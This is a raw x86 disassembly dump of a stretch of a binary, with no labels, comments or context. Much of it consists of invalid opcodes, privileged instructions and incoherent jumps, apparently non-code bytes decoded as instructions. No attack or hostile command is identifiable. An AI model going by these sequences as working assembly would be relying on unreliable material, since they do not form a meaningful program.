  411896:	mov    DWORD PTR [edi+esi*8],esp
  411899:	call   DWORD PTR [edx]
  41189b:	dec    ecx
  41189c:	add    BYTE PTR [eax],al
  41189e:	mov    DWORD PTR [eax],eax
  4118a0:	sbb    ah,BYTE PTR [ebx]
  4118a2:	in     al,dx
  4118a3:	cmp    edi,0xffffffcb
  4118a6:	dec    DWORD PTR [esi]
  4118a8:	cli    
  4118a9:	add    al,bl
  4118ab:	mov    esi,0xff00ff00
  4118b0:	xor    ah,ah
  4118b2:	iret   
  4118b3:	add    BYTE PTR [ebx-0x2e78006d],al
  4118b9:	mov    esp,ebx
  4118bb:	sbb    bh,bh
  4118bd:	add    bh,bh
  4118bf:	call   FWORD PTR [ebp-0x7cff7720]
  4118c5:	cld    
  4118c6:	add    BYTE PTR [esi+0x21],dl
  4118c9:	jmp    FWORD PTR [eax]
  4118cb:	and    BYTE PTR [eax],al
  4118cd:	add    bh,bh
  4118cf:	call   FWORD PTR [ebx+0xff2c8c]
  4118d5:	imul   eax,DWORD PTR [eax],0x43
  4118d8:	add    BYTE PTR [ebx-0xffb260],0x83
  4118df:	push   DWORD PTR ds:0x89cc3c2c
  4118e5:	adc    eax,0xff7bed00
  4118ea:	aaa    
  4118eb:	push   0xcc8300ff
  4118f0:	adc    edx,esi
  4118f2:	(bad)  
  4118f3:	inc    DWORD PTR [eax]
  4118f5:	or     eax,0x83be06ff
  4118fa:	lea    eax,[ebx+0x0]
  4118fd:	inc    DWORD PTR [ebx-0x37fd7877]
  411903:	add    BYTE PTR [ecx-0x14447c60],cl
  411909:	inc    DWORD PTR [edi+0x55]
  41190c:	inc    DWORD PTR [eax]
  41190e:	dec    DWORD PTR [ecx-0x7c7843d5]
  411914:	jmp    DWORD PTR [ebp-0x33318500]
  41191a:	jnp    0x411934
  41191c:	add    DWORD PTR [eax],0xffffff89
  41191f:	jmp    DWORD PTR [eax+0x4c]
  411922:	lods   al,BYTE PTR ds:[esi]
  411923:	inc    DWORD PTR [ebx-0x5861006e]
  411929:	add    ch,ch
  41192b:	cmp    al,BYTE PTR [ebx+0xb00ccff]
  411931:	aaa    
  411932:	pop    esp
  411933:	inc    DWORD PTR [eax]
  411935:	push   ebp
  411936:	inc    ebx
  411938:	scas   al,BYTE PTR es:[edi]
  411939:	inc    DWORD PTR [ebx+edx*1]
  41193c:	mov    esp,ecx
  41193e:	int3   
  41193f:	add    edi,0x1d
  411942:	js     0x4118cd
  411944:	add    dh,bh
  411946:	dec    DWORD PTR [eax*4-0x76203c7d]
  41194d:	add    bh,bh
  41194f:	add    bh,bl
  411951:	mov    bh,0x3e
  411953:	add    BYTE PTR [ebx+0x431d8958],al
  411959:	jmp    FWORD PTR [edx]
  41195b:	data16 add BYTE PTR [eax],al
  41195e:	add    bh,bh
  411960:	nop
  411961:	pop    edx
  411962:	fs cmp edi,0xffffffff
  411966:	int3   
  411967:	or     DWORD PTR gs:[ebx-0x1cfe],eax
  41196e:	add    BYTE PTR [eax],al
  411970:	jmp    0x4119b2
  411972:	push   esi
  411973:	cmp    edi,0x2a
  411976:	inc    eax
  411978:	mov    al,BYTE PTR [eax]
  41197a:	arpl   WORD PTR [ebx-0x1],cx
  41197d:	int3   
  41197e:	add    bh,bh
  411980:	xchg   ecx,eax
  411981:	push   esp
  411982:	arpl   WORD PTR [ecx-0x37007701],cx
  411988:	xchg   ecx,eax
  411989:	mov    DWORD PTR [ecx-0x767cff55],eax
  41198f:	(bad)  
  411990:	mov    edx,0x89ffc500
  411995:	pop    ebp
  411996:	(bad)  
  411997:	mov    ecx,0x3ac6007b
  41199c:	inc    DWORD PTR [eax]
  41199e:	(bad)  
  41199f:	jmp    ecx
  4119a1:	cwde   
  4119a2:	ja     0x4119a4
  4119a4:	jmp    DWORD PTR [esi]
  4119a6:	(bad)  
  4119a7:	out    dx,eax
  4119a8:	jp     0x41192d
  4119aa:	adc    BYTE PTR [edx+0x0],al
  4119ad:	add    bh,bh
  4119af:	sub    DWORD PTR [eax-0xfff7af],0xffffffd4
  4119b6:	mov    DWORD PTR [edi-0x79],esp
  4119b9:	sbb    ecx,0xffffffdd
  4119bc:	inc    DWORD PTR [ebx+0x6138ff00]
  4119c2:	icebp  
  4119c3:	(bad)  
  4119c4:	(bad)  
  4119c5:	out    dx,al
  4119c6:	push   DWORD PTR [edx+0x21fcffc8]
  4119cc:	add    bh,bh
  4119ce:	inc    DWORD PTR [eax]
  4119d0:	jmp    0x409421
  4119d5:	addr16 int3 
  4119d7:	rol    BYTE PTR [eax+eax*1],0x84
  4119db:	(bad)  
  4119dc:	int3   
  4119dd:	add    BYTE PTR [ebx+0x353f8300],al
  4119e3:	add    BYTE PTR [ebx+0x75ebff39],al
  4119e9:	add    eax,0x51
  4119ec:	(bad)  
  4119ed:	(bad)  
  4119ee:	(bad)  
  4119ef:	(bad)  
  4119f0:	aas    
  4119f1:	add    eax,0x20000fe
  4119f6:	add    BYTE PTR [eax],ah
  4119f8:	or     al,BYTE PTR [eax]
  4119fa:	test   BYTE PTR [edx-0xff0100],bl
  411a00:	mov    edx,0x8300860e
  411a05:	(bad)  
  411a06:	dec    DWORD PTR [edx]
  411a08:	sbb    edi,edi
  411a0a:	xchg   ebx,eax
  411a0b:	lods   eax,DWORD PTR ds:[esi]
  411a0c:	add    bh,bh
  411a0e:	int3   
  411a0f:	push   DWORD PTR [esi-0x7c33d2f0]
  411a15:	test   esp,0xbfffe507
  411a1b:	mov    edi,edi
  411a1d:	inc    DWORD PTR [eax]
  411a1f:	int3   
  411a20:	inc    esp
  411a21:	adc    DWORD PTR [esi],eax
  411a23:	cmp    edi,0xffffffe6
  411a26:	add    ch,cl
  411a28:	mov    DWORD PTR [eax],0x31ed
  411a2e:	dec    esp
  411a30:	mov    dl,0xe4
  411a32:	add    ah,cl
  411a34:	jmp    DWORD PTR [eax]
  411a36:	mov    DWORD PTR [ebx],edx
  411a38:	pop    edi
  411a39:	add    al,ah
  411a3b:	xchg   DWORD PTR [eax],eax
  411a3d:	int3   
  411a3e:	int3   
  411a3f:	(bad)  
  411a40:	(bad)  
  411a41:	xchg   ebp,eax
  411a42:	jae    0x411a43
  411a44:	call   DWORD PTR [eax-0x33b37201]
  411a4a:	nop
  411a4b:	bound  eax,QWORD PTR [eax]
  411a4d:	dec    esp
  411a4f:	add    dh,ch
  411a51:	(bad)
  411a54:	push   DWORD PTR ds:0xff7095ff
  411a5a:	add    edx,0xffffffff
  411a5d:	add    BYTE PTR [ebx+0x5b09a0ff],al
  411a63:	inc    DWORD PTR [eax]
  411a65:	cdq    
  411a66:	call   esp
  411a68:	pusha  
  411a69:	call   FWORD PTR [ebx+0x13]
  411a6c:	add    bh,bh
  411a6e:	inc    DWORD PTR [eax]
  411a70:	jg     0x411a57
  411a72:	pop    edi
  411a73:	add    DWORD PTR [eax],0x3d
  411a76:	add    BYTE PTR [ecx+0x2d],bh
  411a79:	(bad)  
  411a7a:	mov    esp,0xffff00a5
  411a7f:	mov    DWORD PTR [ecx],eax
  411a81:	sub    al,0x6e
  411a83:	inc    DWORD PTR [ebx+0x22fa00bc]
  411a89:	inc    ebp
  411a8b:	dec    eax
  411a8c:	add    bh,bh
  411a8e:	inc    DWORD PTR [eax]
  411a90:	sbb    al,0x7c
  411a92:	in     al,0xff
  411a94:	add    al,dh
  411a96:	inc    DWORD PTR [eax+edx*2-0xc48400]
  411a9d:	add    bh,bh
  411a9f:	call   DWORD PTR [ebp-0x61f5]
  411aa5:	icebp  
  411aa6:	mov    DWORD PTR [eax+eax*1],ebp
  411aa9:	inc    DWORD PTR [edx]
  411aab:	(bad)  
  411aad:	dec    esp
  411aaf:	add    BYTE PTR [ecx-0xffbeae],dl
  411ab5:	sbb    eax,DWORD PTR [eax]
  411ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab8:	push   ss
  411ab9:	jmp    DWORD PTR [edi-0x32]
  411abc:	add    bh,bh
  411abe:	add    bh,bh
  411ac0:	mov    eax,ds:0xffff3679
  411ac5:	test   eax,0x679600
  411aca:	js     0x411a67
  411acc:	(bad)  
  411acd:	(bad)  
  411ace:	inc    DWORD PTR [eax]
  411ad0:	gs sub eax,0xc2ffffcc
  411ad6:	(bad)  
  411ad7:	jnp    0x411ad5
  411ad9:	or     DWORD PTR [esi],0x25
  411adc:	(bad)  
  411add:	inc    DWORD PTR [ebx+0x46c4d3ff]
  411ae3:	dec    DWORD PTR [ecx-0x21927c34]
  411ae9:	add    BYTE PTR [esi+0x67],cl
  411aec:	mov    DWORD PTR [eax],eax
  411aee:	(bad)  
  411aef:	inc    DWORD PTR [edi+ebx*1+0x66]
  411af3:	add    DWORD PTR [eax],0xffffffc5
  411af6:	jmp    DWORD PTR [eax+ecx*1]
  411af9:	int3   
  411afa:	cmp    bh,dh
  411afc:	inc    DWORD PTR [eax]
  411afe:	int3   
  411aff:	add    BYTE PTR [edi+ecx*2-0x7000008c],cl
  411b06:	add    BYTE PTR ds:0xf356ffc6,ah
  411b0c:	add    BYTE PTR [eax],al
  411b0e:	add    BYTE PTR [eax],al
  411b10:	push   ebx
  411b11:	pop    esp
  411b12:	aam    0x83
  411b14:	add    BYTE PTR [ebx-0x7d],ah
  411b17:	addr16 lahf 
  411b19:	jmp    DWORD PTR [esi]
  411b1b:	scas   eax,DWORD PTR es:[edi]
  411b1c:	add    bh,bh
  411b1e:	cmp    edi,0xffffffda
  411b21:	test   DWORD PTR [eax-0x1],0xb9ccac00
  411b28:	rol    DWORD PTR [eax],1
  411b2a:	adc    dl,BYTE PTR [edi-0xffff77]
  411b30:	out    dx,al
  411b31:	mov    ah,0xc4
  411b33:	add    BYTE PTR [eax],al
  411b35:	adc    edi,edi
  411b37:	je     0x411ac5
  411b39:	jmp    FWORD PTR [edi]
  411b3b:	sub    BYTE PTR [ebx-0x76007700],al
  411b41:	pop    ds
  411b42:	add    eax,0x7589ff
  411b47:	push   ds
  411b48:	inc    ecx
  411b49:	add    BYTE PTR [esi+eax*1-0x7d],dl
  411b4d:	(bad)  
  411b4e:	inc    DWORD PTR [ebx-0x33e8ba46]
  411b54:	mov    DWORD PTR [edx-0xb6b34],edx
  411b5a:	inc    ebp
  411b5b:	(bad)  
  411b5c:	inc    DWORD PTR [eax]
  411b5e:	int3   
  411b5f:	push   esi
  411b61:	dec    edx
  411b62:	sbb    al,0xff
  411b64:	jmp    DWORD PTR [edx-0x484001]
  411b6a:	(bad)  
  411b6b:	dec    ecx
  411b6c:	inc    DWORD PTR [eax]
  411b6e:	inc    DWORD PTR [eax]
  411b70:	push   ebx
  411b71:	out    dx,eax
  411b72:	repnz add BYTE PTR [ebx+0xd52ff15],al
  411b79:	add    ch,ah
  411b7b:	arpl   WORD PTR [eax],ax
  411b7d:	(bad)  
  411b7e:	(bad)  
  411b7f:	push   DWORD PTR [eax+ebp*4+0x26]
  411b83:	add    BYTE PTR [ebx-0x48717cb8],al
  411b89:	add    dl,ch
  411b8b:	jae    0x411b8d
  411b8d:	int3   
  411b8e:	inc    DWORD PTR [eax]
  411b90:	xchg   ebx,eax
  411b91:	xchg   esp,eax
  411b92:	or     bh,bh
  411b94:	jmp    edi
  411b96:	sbb    DWORD PTR [ecx-0x19db000e],0x0
  411b9d:	add    BYTE PTR [ebx-0xe33b67d],al
  411ba3:	(bad)  
  411ba4:	jmp    FWORD PTR [edi-0x34]
  411ba7:	popf   
  411ba8:	jne    0x411baa
  411baa:	adc    DWORD PTR [ebx],0x0
  411bad:	add    bh,bh
  411baf:	(bad)  
  411bb0:	call   0xccc47cb5
  411bb5:	jmp    0x4ad:0xcce8e1ff
  411bbc:	add    bh,bh
  411bbe:	mov    edi,edi
  411bc0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc2:	popa   
  411bc3:	inc    DWORD PTR [eax]
  411bc5:	cmp    eax,DWORD PTR [ebx-0x267c0201]
  411bcb:	jmp    0x411bcc
  411bcd:	mov    esp,ecx
  411bcf:	int3   
  411bd0:	sti    
  411bd1:	inc    esi
  411bd2:	jg     0x411bd3
  411bd4:	add    BYTE PTR [esi+0x9214cc],dh
  411bda:	sbb    ch,BYTE PTR [edi]
  411bdc:	(bad)  
  411bdd:	dec    DWORD PTR [ecx-0x55c4c434]
  411be3:	add    BYTE PTR [eax],al
  411be5:	cs (bad) 
  411be7:	fstp   DWORD PTR [edx-0x5f0d01]
  411bed:	add    bh,bh
  411bef:	add    BYTE PTR [ebx],cl
  411bf1:	shl    DWORD PTR [ebx-0x390034],cl
  411bf7:	frstor [eax-0x7c511300]
  411bfd:	(bad)  
  411bfe:	inc    DWORD PTR [eax]
  411c00:	sbb    dl,BYTE PTR [ecx+0x14]
  411c03:	dec    esp
  411c05:	stc    
  411c06:	add    bl,ch
  411c08:	and    bh,bh
  411c0a:	scas   eax,DWORD PTR es:[edi]
  411c0b:	dec    eax
  411c0c:	(bad)  
  411c0d:	(bad)  
  411c0e:	inc    DWORD PTR [eax]
  411c10:	hlt    
  411c11:	popf   
  411c12:	jne    0x411be0
  411c14:	(bad)  
  411c15:	stc    
  411c16:	add    dl,ah
  411c18:	dec    WORD PTR [ebx-0x7c3300d0]
  411c1f:	adc    esi,0xffffffa9
  411c22:	dec    esp
  411c23:	(bad)  
  411c24:	(bad)  
  411c25:	mov    ebp,0x83b74eff
  411c2a:	bound  ebp,QWORD PTR [edx]
  411c2c:	(bad)  
  411c2d:	(bad)  
  411c2e:	inc    DWORD PTR [eax]
  411c30:	pushf  
  411c31:	xor    DWORD PTR [esi],esp
  411c33:	add    bh,bh
  411c35:	retf   
  411c36:	add    bh,cl
  411c38:	jecxz  0x411c06
  411c3a:	inc    eax
  411c3b:	push   cs
  411c3c:	inc    DWORD PTR [eax]
  411c3e:	mov    DWORD PTR [eax],eax
  411c40:	cmp    BYTE PTR [edi],cl
  411c42:	ss int3 
  411c44:	int3   
  411c45:	rol    DWORD PTR [eax],1
  411c47:	add    BYTE PTR [ecx+0x83],cl
  411c4d:	cmp    edi,0xffffffff
  411c50:	(bad)  
  411c51:	push   DWORD PTR [esi-0x7d]
  411c54:	ror    BYTE PTR [edi+0x23],1
  411c57:	ja     0x411ca1
  411c59:	push   ebp
  411c5a:	(bad)  
  411c5b:	(bad)  
  411c5c:	(bad)  
  411c5d:	inc    DWORD PTR [eax]
  411c5f:	out    0xcc,eax
  411c61:	(bad)  
  411c62:	jg     0x411c64
  411c64:	lods   eax,DWORD PTR ds:[esi]
  411c65:	sbb    al,0xe5
  411c67:	ffreep st(6)
  411c69:	imul   eax,DWORD PTR [ebx-0xffff01],0xffffff92
  411c70:	inc    DWORD PTR [eax]
  411c72:	mov    cs,esp
  411c74:	xchg   esi,eax
  411c75:	stc    
  411c76:	in     al,dx
  411c77:	sub    eax,0xcc00bb9c
  411c7c:	add    BYTE PTR [ebx-0x7c7c4d7d],al
  411c82:	and    al,0x0
  411c84:	loope  0x411c76
  411c86:	push   ecx
  411c87:	adc    DWORD PTR [ebx-0x5e],edx
  411c8a:	add    BYTE PTR [ecx+0x2effffff],cl
  411c90:	inc    DWORD PTR [ebx+0x5a3b0018]
  411c96:	jb     0x411cff
  411c98:	scas   al,BYTE PTR es:[di]
  411c9a:	or     DWORD PTR [ecx-0x5900007d],0xffffffff
  411ca1:	(bad)  
  411ca2:	inc    BYTE PTR [eax]
  411ca4:	sub    esi,DWORD PTR [ebp+0x69b6dbc3]
  411caa:	add    BYTE PTR [ecx+0x2f83ffcc],cl
  411cb0:	mov    esp,ecx
  411cb2:	clc    
  411cb3:	dec    DWORD PTR [ecx]
  411cb5:	out    0xcd,eax
  411cb7:	mov    ds:0x83001bbb,eax
  411cbc:	int3   
  411cbd:	add    DWORD PTR [eax],0xffffffdb
  411cc0:	(bad)  
  411cc1:	dec    DWORD PTR [edi+edi*8-0xb]
  411cc5:	ss mov ecx,0xffc46764
  411ccb:	mov    edi,edi
  411ccd:	add    bh,bh
  411ccf:	lock add BYTE PTR [eax],al
  411cd2:	cdq    
  411cd3:	inc    DWORD PTR [edx-0x7f8e9f9c]
  411cd9:	call   0x7f00:0xff0083ff
  411ce0:	int3   
  411ce1:	or     DWORD PTR [ecx-0x1],0xffffffbb
  411ce5:	and    edx,0xff3ea2b0
  411ceb:	inc    DWORD PTR [eax]
  411ced:	(bad)  
  411cee:	(bad)  
  411cef:	in     al,dx
  411cf0:	add    bh,bh
  411cf2:	dec    ebp
  411cf3:	inc    DWORD PTR [ebx-0x6e88342b]
  411cf9:	scas   eax,DWORD PTR es:[edi]
  411cfa:	inc    DWORD PTR [eax]
  411cfc:	(bad)  
  411cfd:	inc    DWORD PTR [ebx-0x5176002f]
  411d03:	call   FWORD PTR ds:0x4f9c9c9f
  411d09:	dec    edi
  411d0a:	(bad)  
  411d0b:	inc    DWORD PTR [ebx-0xd77c7d]
  411d11:	add    BYTE PTR [ecx+0x0],bh
  411d14:	imul   eax,ecx,0xffc47a4f
  411d1a:	mov    edi,edi
  411d1c:	inc    DWORD PTR [ebx-0x337600]
  411d22:	add    eax,0xc0687fff
  411d27:	mov    cl,BYTE PTR [ebp+ebx*4+0xffffff]
  411d2e:	xor    DWORD PTR [esi-0xb30001],0x42
  411d35:	xor    DWORD PTR [ebx-0x4b1fe8],esi
  411d3b:	int3   
  411d3c:	add    BYTE PTR [eax],al
  411d3e:	call   DWORD PTR [ecx-0x1]
  411d41:	add    BYTE PTR [edi+edi*8-0x22],al
  411d45:	pop    ebp
  411d46:	xor    bh,cl
  411d48:	daa    
  411d49:	lock add bh,bh
  411d4c:	or     esp,0xffffff89
  411d4f:	je     0x411d1d
  411d51:	jmp    DWORD PTR ds:0x1bb139ff
  411d57:	push   edi
  411d58:	pop    eax
  411d59:	xchg   esi,eax
  411d5a:	mov    DWORD PTR [eax],eax
  411d5c:	dec    DWORD PTR [ecx-0xff5600]
  411d62:	stos   DWORD PTR es:[edi],eax
  411d63:	push   DWORD PTR [edi]
  411d65:	shl    DWORD PTR [edi+0xd9a12d],0xcc
  411d6c:	int3   
  411d6d:	(bad)  
  411d6e:	push   DWORD PTR [edx-0x1]
  411d71:	add    al,cl
  411d73:	add    BYTE PTR [ebp+0x4c],ah
  411d76:	and    eax,0xffc60acd
  411d7b:	(bad)  
  411d7c:	inc    DWORD PTR [eax]
  411d7e:	add    BYTE PTR ds:0x56ffff,bh
  411d84:	dec    ecx
  411d85:	stc    
  411d86:	out    dx,al
  411d87:	push   ss
  411d88:	imul   edx,DWORD PTR [eax+eax*1+0x0],0xffffffff
  411d8d:	mov    DWORD PTR [ebx-0x4000002f],eax
  411d93:	mov    DWORD PTR [ebx+0x7e],ecx
  411d96:	mov    ebx,0x1d6a22
  411d9b:	add    DWORD PTR [eax],0xffffffcc
  411d9e:	(bad)  
  411d9f:	cmp    eax,0xff030000
  411da4:	(bad)  
  411da6:	mov    ?,WORD PTR [esi]
  411da8:	es dec ebx
  411daa:	inc    DWORD PTR [ebx+0x45830083]
  411db0:	dec    esp
  411db2:	in     eax,dx
  411db3:	sbb    DWORD PTR [eax-0x5b7f8eef],0x28
  411dba:	(bad)  
  411dbb:	dec    DWORD PTR [ecx-0x3343ff7d]
  411dc1:	add    BYTE PTR [eax],dh
  411dc3:	(bad)  
  411dc4:	call   FWORD PTR [ebx+ecx*2+0x2f2682]
  411dcb:	(bad)  
  411dcc:	inc    DWORD PTR [ebx-0xff247d]
  411dd2:	int3   
  411dd3:	add    ah,ah
  411dd5:	mov    esp,0xb44ba30b
  411dda:	inc    DWORD PTR [eax]
  411ddc:	or     DWORD PTR [ecx+0xffe4ff],0x6a
  411de3:	(bad)  
  411de4:	ficomp DWORD PTR [edx+ecx*4]
  411de7:	sub    BYTE PTR [esi*8+0xff00ff],dh
  411dee:	(bad)  
  411def:	mov    edi,0xae0000
  411df4:	je     0x411e51
  411df6:	out    dx,eax
  411df7:	outs   dx,BYTE PTR ds:[esi]
  411df8:	pusha  
  411df9:	std    
  411dfa:	mov    esp,ecx
  411dfc:	inc    DWORD PTR [ebx+0xcc6700]
  411e02:	mov    cl,0xff
  411e04:	ins    DWORD PTR es:[edi],dx
  411e05:	mov    ah,0xba
  411e07:	leave  
  411e08:	ja     0x411e81
  411e0a:	inc    DWORD PTR [eax]
  411e0c:	inc    DWORD PTR [eax]
  411e0e:	cmp    DWORD PTR [edi+0x0],0x0
  411e12:	sub    eax,0xf9064f00
  411e17:	cmp    DWORD PTR [edi+0xffffe0],edi
  411e1d:	mov    edi,edi
  411e1f:	scas   al,BYTE PTR es:[edi]
  411e20:	int3   
  411e21:	inc    ebx
  411e23:	push   DWORD PTR [esi+0x18]
  411e26:	dec    esp
  411e27:	lock push ss
  411e29:	repz inc DWORD PTR [eax]
  411e2c:	mov    edi,edi
  411e2e:	jmp    FWORD PTR [ecx-0xb3301]
  411e34:	fwait
  411e35:	fwait
  411e36:	cld    
  411e37:	push   ebp
  411e38:	inc    esp
  411e39:	jmp    0x17ff:0xffffff83
  411e40:	dec    esp
  411e42:	cwde   
  411e43:	add    BYTE PTR [ebp-0x22a4e0e2],dh
  411e49:	jo     0x411e4a
  411e4b:	add    BYTE PTR [ebx-0x76340100],al
  411e51:	add    BYTE PTR [edx-0x4a012f34],dh
  411e57:	push   ebx
  411e58:	outs   dx,DWORD PTR ds:[esi]
  411e59:	arpl   sp,cx
  411e5b:	cmp    edi,0xffffff83
  411e5e:	inc    DWORD PTR [edi+edi*8-0x1]
  411e62:	data16 add BYTE PTR [edi-0x67],cl
  411e66:	mov    bh,0xf5
  411e69:	sar    bh,1
  411e6b:	int3   
  411e6c:	(bad)  
  411e6d:	(bad)  
  411e6e:	call   FWORD PTR ds:0xff33ffff
  411e74:	cdq    
  411e75:	cmp    bh,BYTE PTR [edi-0x55]
  411e78:	call   0xff00:0xffcc79
  411e7f:	ds add bh,bh
  411e82:	dec    ebp
  411e83:	push   DWORD PTR [eax-0x25]
  411e86:	jns    0x411eab
  411e88:	xchg   ebx,eax
  411e89:	mov    WORD PTR [eax],es
  411e8b:	add    BYTE PTR [eax],al
  411e8d:	add    bh,bh
  411e8f:	idiv   edi
  411e91:	add    ch,cl
  411e93:	add    BYTE PTR [esi+edx*4],ah
  411e96:	daa    
  411e97:	punpckldq mm7,DWORD PTR [eax]
  411e9a:	inc    DWORD PTR [eax]
  411e9c:	add    bh,bh
  411e9e:	add    BYTE PTR [ebp-0x1],bl
  411ea1:	add    dl,cl
  411ea3:	mov    DWORD PTR [ebx+0x33],ebp
  411ea6:	xchg   esi,eax
  411ea7:	in     al,0xce
  411ea9:	dec    edi
  411eaa:	add    BYTE PTR [eax],al
  411eac:	int3   
  411ead:	add    DWORD PTR [eax],0x15
  411eb0:	(bad)  
  411eb1:	(bad)  
  411eb2:	std    
  411eb3:	jmp    ebx
  411eb5:	inc    ecx
  411eb6:	pop    edi
  411eb7:	outs   dx,DWORD PTR ds:[esi]
  411eb8:	and    DWORD PTR [ebp+0x0],esi
  411ebb:	add    BYTE PTR [eax],al
  411ebd:	inc    DWORD PTR [ebx-0x50007c34]
  411ec3:	(bad)  
  411ec4:	mov    ebp,0xfad4c9d5
  411ec9:	idiv   edi
  411ecb:	(bad)  
  411ecc:	(bad)  
  411ecd:	(bad)  
  411ece:	inc    DWORD PTR [eax+0x54ffff]
  411ed4:	sbb    DWORD PTR [eax-0x31],ecx
  411ed7:	int    0x2a
  411ed9:	pop    eax
  411eda:	(bad)  
  411edb:	dec    DWORD PTR [ecx+0x8c0000]
  411ee1:	call   FWORD PTR [edx+0x6a57a300]
  411ee7:	fwait
  411ee8:	sbb    eax,0xffff00f8
  411eed:	mov    DWORD PTR [eax],eax
  411eef:	sub    edi,edi
  411ef1:	call   FWORD PTR [eax]
  411ef3:	xor    DWORD PTR [eax+0x4f756e3a],0xffffffa9
  411efa:	(bad)  
  411efb:	dec    esp
  411efd:	add    bh,bh
  411eff:	mov    bh,0x0
  411f01:	add    BYTE PTR [esi-0x8d9787d],cl
  411f07:	int3   
  411f08:	ins    DWORD PTR es:[edi],dx
  411f09:	dec    ebp
  411f0a:	add    bh,bh
  411f0c:	add    ah,cl
  411f0e:	(bad)  
  411f0f:	inc    DWORD PTR ds:[eax]
  411f12:	and    DWORD PTR [ebx+0x2ffd12fd],eax
  411f18:	sbb    al,0x5b
  411f1a:	int3   
  411f1b:	add    DWORD PTR [ebx+0x100000],0x0
  411f22:	mov    WORD PTR [ecx-0x34b2ae54],cs
  411f28:	jecxz  0x411ecf
  411f2a:	mov    edi,edi
  411f2c:	mov    edi,edi
  411f2e:	cmp    DWORD PTR [eax],0xffffffff
  411f31:	push   DWORD PTR [edi+edi*8-0x665c31ab]
  411f38:	fadd   QWORD PTR [esp+ecx*8+0xff8983]
  411f3f:	pop    esp
  411f40:	cmp    edi,0x7c
  411f43:	add    BYTE PTR [edi],al
  411f45:	dec    ecx
  411f46:	mov    al,ds:0xffb4d296
  411f4b:	dec    esp
  411f4d:	inc    DWORD PTR [eax]
  411f4f:	mov    DWORD PTR [ecx-0x1c7c3377],ecx
  411f55:	push   esi
  411f56:	push   edx
  411f57:	mov    ebx,0x62b5
  411f5c:	inc    DWORD PTR [eax]
  411f5e:	add    BYTE PTR [eax],bl
  411f60:	int3   
  411f61:	add    BYTE PTR [eax],dl
  411f63:	jmp    DWORD PTR [ebp-0x9]
  411f66:	clc    
  411f67:	es pop esp
  411f69:	jne    0x411f6b
  411f6b:	dec    esp
  411f6d:	or     esp,0x9
  411f70:	inc    DWORD PTR [eax]
  411f72:	jno    0x411f73
  411f74:	cmp    eax,0xdfc17f00
  411f79:	arpl   di,di
  411f7b:	add    DWORD PTR [eax],0x0
  411f7e:	jmp    FWORD PTR [ebp-0xcd7d00]
  411f84:	inc    ebx
  411f85:	loope  0x411fc5
  411f87:	mov    al,0x4e
  411f89:	int    0xff
  411f8b:	int3   
  411f8c:	(bad)  
  411f8d:	(bad)  
  411f8e:	jmp    DWORD PTR [eax]
  411f90:	mov    DWORD PTR [eax],eax
  411f92:	mov    dl,0x0
  411f94:	aaa    
  411f95:	int3   
  411f96:	jae    0x411f6c
  411f98:	mov    al,0xd1
  411f9a:	(bad)  
  411f9b:	(bad)  
  411f9c:	inc    DWORD PTR [eax]
  411f9e:	call   DWORD PTR [esi]
  411fa0:	inc    DWORD PTR [ebx-0x799c7c4c]
  411fa6:	pop    edi
  411fa7:	pop    ecx
  411fa8:	loop   0x411fd6
  411faa:	(bad)  
  411fab:	(bad)  
  411fac:	(bad)  
  411fad:	dec    esp
  411faf:	cmp    DWORD PTR [ecx-0x1000ef01],ecx
  411fb5:	lods   al,BYTE PTR ds:[esi]
  411fb6:	jo     0x411fed
  411fb8:	cmc    
  411fb9:	stc    
  411fba:	inc    DWORD PTR [eax]
  411fbc:	int3   
  411fbd:	(bad)  
  411fbe:	push   DWORD PTR [esp+ecx*8]
  411fc1:	call   FWORD PTR [edi-0x7d]
  411fc4:	xchg   edi,eax
  411fc5:	dec    edx
  411fc6:	icebp  
  411fc7:	cmp    al,BYTE PTR [eax-0xff00ae]
  411fcd:	add    DWORD PTR [ebx+0x69cc00f1],0xffffff83
  411fd4:	retf   0xe06
  411fd7:	inc    esi
  411fd8:	jo     0x411ff5
  411fda:	(bad)  
  411fdb:	dec    DWORD PTR [ecx+0xb68900]
  411fe1:	int3   
  411fe2:	test   al,0x83
  411fe4:	cdq    
  411fe5:	test   al,0x9b
  411fe7:	sbb    eax,0xff00a90a
  411fec:	(bad)  
  411fed:	(bad)  
  411fee:	push   eax
  411ff0:	int3   
  411ff1:	add    BYTE PTR [ebp-0x339c8e7d],bh
  411ff7:	sahf   
  411ff8:	je     0x412008
  411ffa:	add    BYTE PTR [eax],al
  411ffc:	(bad)  
  411ffd:	inc    DWORD PTR [ebx-0x2dff33c9]
  412003:	(bad)  
  412004:	jmp    0xd7d0dd4f
  412009:	pop    es
  41200a:	cmp    edi,0xffffffff
  41200d:	dec    esp
  41200f:	mov    edi,0xff4d8900
  412014:	fcom   DWORD PTR [eax+ecx*1]
  412017:	add    ch,BYTE PTR [edx]
  412019:	pop    edi
  41201a:	int3   
  41201b:	add    BYTE PTR [ecx-0x510001],cl
  412021:	int3   
  412022:	xchg   ebp,eax
  412023:	push   DWORD PTR [ebx-0x6108024c]
  412029:	pop    esi
  41202a:	dec    esp
  41202c:	mov    edi,edi
  41202e:	mov    esi,edx
  412030:	cmp    edi,0xffffffec
  412033:	add    DWORD PTR [edx],0xffffff99
  412036:	inc    edi
  412037:	add    DWORD PTR [ebp+0x36],0x838300ff
  41203e:	call   FWORD PTR [ecx+0x39ff00]
  412044:	dec    ebx
  412045:	add    BYTE PTR [ecx],ch
  412047:	(bad)  
  412048:	bound  ebx,QWORD PTR [edx-0xff0100]
  41204e:	push   eax
  412050:	inc    DWORD PTR [eax]
  412052:	sar    edi,cl
  412054:	stos   BYTE PTR es:[edi],al
  412055:	fistp  QWORD PTR [edi-0x6dfb72]
  41205b:	cmp    edi,0xffffffff
  41205e:	add    ch,ch
  412060:	inc    DWORD PTR [eax]
  412062:	sub    edi,edi
  412064:	push   esp
  412065:	inc    ebx
  412066:	sbb    ch,BYTE PTR [eax+0x10]
  412069:	outs   dx,DWORD PTR ds:[esi]
  41206a:	mov    esp,ecx
  41206c:	add    BYTE PTR [ecx+0x8dff],cl
  412072:	jae    0x7c7be8e1
  412078:	lds    ebp,FWORD PTR [edx-0xff7601]
  41207e:	add    dh,al
  412080:	(bad)  
  412081:	(bad)  
  412082:	(bad)  
  412083:	push   ebx
  412085:	test   DWORD PTR [edx-0x650],ecx
  41208b:	inc    DWORD PTR [eax]
  41208d:	add    bh,bh
  41208f:	jae    0x412091
  412091:	or     DWORD PTR [eax],0xffffffcc
  412094:	std    
  412095:	jne    0x4120f6
